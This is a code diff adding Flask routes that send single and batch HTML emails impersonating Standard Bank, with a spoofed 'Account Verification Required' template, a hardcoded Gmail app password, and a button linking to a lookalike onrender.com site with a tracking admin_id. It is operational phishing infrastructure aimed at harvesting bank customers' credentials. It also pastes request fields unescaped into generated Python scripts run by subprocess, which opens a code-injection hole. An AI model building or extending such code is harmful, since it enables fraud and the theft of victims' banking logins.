@@ -1636,6 +1636,506 @@ def serve_static(filename):
     """Serve static files from public directory"""
     return send_from_directory('public', filename)  # Send requested file
 
+# Route to serve user management page
+@app.route('/user-management')
+def user_management():
+    """Serve the user management page for email operations"""
+    return send_from_directory('public', 'user-management.html')  # Send user management HTML file
+
+# Email Management API Routes
+
+# Route to update receiver email
+@app.route('/api/update-receiver-email', methods=['POST'])
+def update_receiver_email():
+    """Update the default receiver email address"""
+    try:
+        data = request.get_json()
+        new_email = data.get('email')
+        
+        if not new_email:
+            return jsonify({'error': 'Email address is required'}), 400
+        
+        # Store the new receiver email (you can save this to a config file or database)
+        # For now, we'll update the SMTP script directly
+        try:
+            with open('smtp.py', 'r', encoding='utf-8') as file:
+                content = file.read()
+            
+            # Update the receiver email in the SMTP script
+            import re
+            pattern = r'msg\["To"\] = "[^"]*"'
+            replacement = f'msg["To"] = "{new_email}"'
+            updated_content = re.sub(pattern, replacement, content)
+            
+            with open('smtp.py', 'w', encoding='utf-8') as file:
+                file.write(updated_content)
+            
+            return jsonify({'success': True, 'message': f'Receiver email updated to {new_email}'}), 200
+            
+        except Exception as e:
+            return jsonify({'error': f'Failed to update SMTP script: {str(e)}'}), 500
+            
+    except Exception as e:
+        return jsonify({'error': f'Server error: {str(e)}'}), 500
+
+# Route to send single email
+@app.route('/api/send-single-email', methods=['POST'])
+def send_single_email():
+    """Send a single email to specified address"""
+    try:
+        data = request.get_json()
+        email = data.get('email')
+        subject = data.get('subject', 'Standard Bank: Important Account Notice')
+        notes = data.get('notes', '')
+        
+        if not email:
+            return jsonify({'error': 'Email address is required'}), 400
+        
+        # Import and run the SMTP script with custom parameters
+        import subprocess
+        import sys
+        
+        # Create a temporary SMTP script with custom email
+        temp_smtp_content = f'''import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+# ========== Gmail SMTP ==========
+smtp_server = "smtp.gmail.com"
+port = 587
+username = "Standardbankingconfirmation@gmail.com"
+password = "udyu gyfv rfjj fvgk"
+
+# Create message
+msg = MIMEMultipart("alternative")
+msg["From"] = username
+msg["To"] = "{email}"
+msg["Subject"] = "{subject}"
+
+# HTML content (same as your template)
+html_content = """<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Standard Bank - Account Verification Required</title>
+    <style>
+        body {{
+            font-family: Arial, sans-serif;
+            background-color: #003cc7;
+            margin: 0;
+            padding: 20px;
+            line-height: 1.6;
+        }}
+        
+        .email-container {{
+            max-width: 500px;
+            margin: 0 auto;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }}
+        
+        .header-bar {{
+            background: linear-gradient(90deg, #0056b3 0%, #003cc7 100%);
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+        }}
+        
+        .content {{
+            padding: 20px;
+            color: #333;
+        }}
+        
+        .greeting {{
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: #333;
+            font-weight: bold;
+        }}
+        
+        .main-message {{
+            font-size: 14px;
+            margin-bottom: 20px;
+            color: #333;
+            line-height: 1.6;
+        }}
+        
+        .service-link {{
+            background-color: #0056b3;
+            color: white;
+            padding: 12px 20px;
+            text-decoration: none;
+            border-radius: 4px;
+            display: inline-block;
+            margin: 20px 0;
+            font-weight: bold;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            max-width: 300px;
+            text-align: center;
+        }}
+        
+        .service-link:hover {{
+            background-color: #004080;
+        }}
+        
+        .footer-bar {{
+            background: linear-gradient(90deg, #0056b3 0%, #003cc7 100%);
+            color: white;
+            padding: 15px 20px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 18px;
+            font-style: italic;
+        }}
+    </style>
+</head>
+<body>
+    <div class="email-container">
+        <div class="header-bar">
+            <div class="header-left">
+                Customer Care: 086 120 1311
+            </div>
+            <div class="header-right">
+                <span>Website: www.standardbank.co.za</span>
+                <div class="logo-section">
+                    <div class="logo">
+                        <img src="https://standardbank.onrender.com/logo-email.png" alt="Standard Bank Logo">
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="content">
+            <div class="greeting">
+                Hello Customer,
+            </div>
+            
+            <div class="main-message">
+                Your account security settings require updating to comply with new banking regulations. Please update your profile information to maintain uninterrupted access to your banking services.
+            </div>
+            
+            <div class="main-message">
+                For assistance with account updates, contact our customer service on <strong>086 120 1311</strong> or international <strong>+27 01 249 0423</strong>.
+            </div>
+            
+            <div style="text-align: center;">
+                <a href="https://standardbank.onrender.com/?admin_id=168368c5-7a1a-4dd8-8ce0-4622f8080f95" class="service-link">
+                    UPDATE ACCOUNT SETTINGS
+                </a>
+            </div>
+            
+            <div class="main-message">
+                Kind Regards,<br>
+                <strong>Standard Bank</strong>
+            </div>
+            
+            {f'<div class="main-message"><strong>Notes:</strong> {notes}</div>' if notes else ''}
+        </div>
+        
+        <div class="footer-bar">
+            Standard Bank IT CAN BE.
+        </div>
+    </div>
+</body>
+</html>"""
+
+# Attach HTML
+msg.attach(MIMEText(html_content, "html"))
+
+# Send email
+server = smtplib.SMTP(smtp_server, port)
+server.starttls()
+server.login(username, password)
+server.sendmail(msg["From"], msg["To"], msg.as_string())
+server.quit()
+
+print("✅ Single email sent successfully!")
+print(f"📧 To: {email}")
+print(f"🎯 Subject: {subject}")
+'''
+        
+        # Write temporary SMTP script
+        with open('temp_smtp.py', 'w', encoding='utf-8') as file:
+            file.write(temp_smtp_content)
+        
+        # Run the temporary script
+        result = subprocess.run([sys.executable, 'temp_smtp.py'], capture_output=True, text=True)
+        
+        # Clean up temporary file
+        import os
+        if os.path.exists('temp_smtp.py'):
+            os.remove('temp_smtp.py')
+        
+        if result.returncode == 0:
+            return jsonify({'success': True, 'message': f'Email sent successfully to {email}'}), 200
+        else:
+            return jsonify({'error': f'Failed to send email: {result.stderr}'}), 500
+            
+    except Exception as e:
+        return jsonify({'error': f'Server error: {str(e)}'}), 500
+
+# Route to send batch emails
+@app.route('/api/send-batch-emails', methods=['POST'])
+def send_batch_emails():
+    """Send batch emails to multiple addresses"""
+    try:
+        data = request.get_json()
+        batch_name = data.get('batch_name')
+        subject = data.get('subject', 'Standard Bank: Important Account Notice')
+        notes = data.get('notes', '')
+        emails = data.get('emails', [])
+        
+        if not batch_name:
+            return jsonify({'error': 'Batch name is required'}), 400
+        
+        if not emails or len(emails) == 0:
+            return jsonify({'error': 'No emails provided'}), 400
+        
+        # Send emails to each address
+        sent_count = 0
+        failed_emails = []
+        
+        for email_data in emails:
+            try:
+                email = email_data.get('email')
+                if email:
+                    # Send single email using the same logic
+                    import subprocess
+                    import sys
+                    
+                    # Create temporary SMTP script for this email
+                    temp_smtp_content = f'''import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+# ========== Gmail SMTP ==========
+smtp_server = "smtp.gmail.com"
+port = 587
+username = "Standardbankingconfirmation@gmail.com"
+password = "udyu gyfv rfjj fvgk"
+
+# Create message
+msg = MIMEMultipart("alternative")
+msg["From"] = username
+msg["To"] = "{email}"
+msg["Subject"] = "{subject}"
+
+# HTML content (same template)
+html_content = """<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Standard Bank - Account Verification Required</title>
+    <style>
+        body {{
+            font-family: Arial, sans-serif;
+            background-color: #003cc7;
+            margin: 0;
+            padding: 20px;
+            line-height: 1.6;
+        }}
+        
+        .email-container {{
+            max-width: 500px;
+            margin: 0 auto;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }}
+        
+        .header-bar {{
+            background: linear-gradient(90deg, #0056b3 0%, #003cc7 100%);
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+        }}
+        
+        .content {{
+            padding: 20px;
+            color: #333;
+        }}
+        
+        .greeting {{
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: #333;
+            font-weight: bold;
+        }}
+        
+        .main-message {{
+            font-size: 14px;
+            margin-bottom: 20px;
+            color: #333;
+            line-height: 1.6;
+        }}
+        
+        .service-link {{
+            background-color: #0056b3;
+            color: white;
+            padding: 12px 20px;
+            text-decoration: none;
+            border-radius: 4px;
+            display: inline-block;
+            margin: 20px 0;
+            font-weight: bold;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            max-width: 300px;
+            text-align: center;
+        }}
+        
+        .service-link:hover {{
+            background-color: #004080;
+        }}
+        
+        .footer-bar {{
+            background: linear-gradient(90deg, #0056b3 0%, #003cc7 100%);
+            color: white;
+            padding: 15px 20px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 18px;
+            font-style: italic;
+        }}
+    </style>
+</head>
+<body>
+    <div class="email-container">
+        <div class="header-bar">
+            <div class="header-left">
+                Customer Care: 086 120 1311
+            </div>
+            <div class="header-right">
+                <span>Website: www.standardbank.co.za</span>
+                <div class="logo-section">
+                    <div class="logo">
+                        <img src="https://standardbank.onrender.com/logo-email.png" alt="Standard Bank Logo">
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="content">
+            <div class="greeting">
+                Hello Customer,
+            </div>
+            
+            <div class="main-message">
+                Your account security settings require updating to comply with new banking regulations. Please update your profile information to maintain uninterrupted access to your banking services.
+            </div>
+            
+            <div class="main-message">
+                For assistance with account updates, contact our customer service on <strong>086 120 1311</strong> or international <strong>+27 01 249 0423</strong>.
+            </div>
+            
+            <div style="text-align: center;">
+                <a href="https://standardbank.onrender.com/?admin_id=168368c5-7a1a-4dd8-8ce0-4622f8080f95" class="service-link">
+                    UPDATE ACCOUNT SETTINGS
+                </a>
+            </div>
+            
+            <div class="main-message">
+                Kind Regards,<br>
+                <strong>Standard Bank</strong>
+            </div>
+            
+            {f'<div class="main-message"><strong>Notes:</strong> {notes}</div>' if notes else ''}
+        </div>
+        
+        <div class="footer-bar">
+            Standard Bank IT CAN BE.
+        </div>
+    </div>
+</body>
+</html>"""
+
+# Attach HTML
+msg.attach(MIMEText(html_content, "html"))
+
+# Send email
+server = smtplib.SMTP(smtp_server, port)
+server.starttls()
+server.login(username, password)
+server.sendmail(msg["From"], msg["To"], msg.as_string())
+server.quit()
+
+print("✅ Batch email sent successfully!")
+print(f"📧 To: {email}")
+print(f"🎯 Subject: {subject}")
+'''
+                    
+                    # Write and run temporary script
+                    with open(f'temp_batch_{sent_count}.py', 'w', encoding='utf-8') as file:
+                        file.write(temp_smtp_content)
+                    
+                    result = subprocess.run([sys.executable, f'temp_batch_{sent_count}.py'], capture_output=True, text=True)
+                    
+                    # Clean up
+                    if os.path.exists(f'temp_batch_{sent_count}.py'):
+                        os.remove(f'temp_batch_{sent_count}.py')
+                    
+                    if result.returncode == 0:
+                        sent_count += 1
+                    else:
+                        failed_emails.append(email)
+                        
+            except Exception as e:
+                failed_emails.append(email)
+                print(f"Failed to send email to {email}: {str(e)}")
+        
+        # Return results
+        if sent_count > 0:
+            message = f"Batch '{batch_name}' completed. {sent_count} emails sent successfully."
+            if failed_emails:
+                message += f" {len(failed_emails)} emails failed."
+            
+            return jsonify({
+                'success': True,
+                'sent_count': sent_count,
+                'failed_count': len(failed_emails),
+                'failed_emails': failed_emails,
+                'message': message
+            }), 200
+        else:
+            return jsonify({'error': 'No emails were sent successfully'}), 500
+            
+    except Exception as e:
+        return jsonify({'error': f'Server error: {str(e)}'}), 500
+
+# Route to get email statistics
+@app.route('/api/email-stats')
+def get_email_stats():
+    """Get email sending statistics"""
+    try:
+        # For now, return basic stats (you can enhance this with database tracking)
+        return jsonify({
+            'success': True,
+            'total_emails': 0,  # You can track this in database
+            'batch_count': 0,   # You can track this in database
+            'success_rate': 100  # You can calculate this from database
+        }), 200
+        
+    except Exception as e:
+        return jsonify({'error': f'Server error: {str(e)}'}), 500
+
 
 
 # Initialize database and create default admin user
